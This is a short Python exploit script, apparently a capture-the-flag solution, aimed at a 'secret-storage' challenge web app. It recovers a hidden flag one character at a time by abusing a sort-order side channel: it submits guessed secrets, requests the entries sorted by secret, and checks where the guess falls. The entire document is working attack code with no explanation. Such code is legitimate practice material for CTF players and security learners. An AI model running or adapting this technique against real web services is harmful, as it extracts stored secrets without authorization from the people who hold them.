#!/usr/bin/env python3
import  requests, re

prefix = 'flag{'
URL = 'https://secret-storage.challs.olicyber.it/'
REGEX = r'<tr>[\n].*?[\n].*?[\n].*?<\/tr>'

while not prefix.endswith('}'):
    for c in range(35, 126):
        s = requests.Session()
        s.post(URL)
        s.post(URL, data={'name': prefix + chr(c), 'secret': prefix + chr(c)})
        r = s.get(URL + '?order=secret')
        f = re.findall(REGEX, r.text)
        f = [x.replace('\n','').replace('\t', '') for x in f][1:]

        if prefix + chr(c) in f[1]:
            prefix += chr(c-1)
            print(f)
            break
        else:
            print(f'Nope: {prefix + chr(c)}', flush=True)
    print(prefix, flush=True)
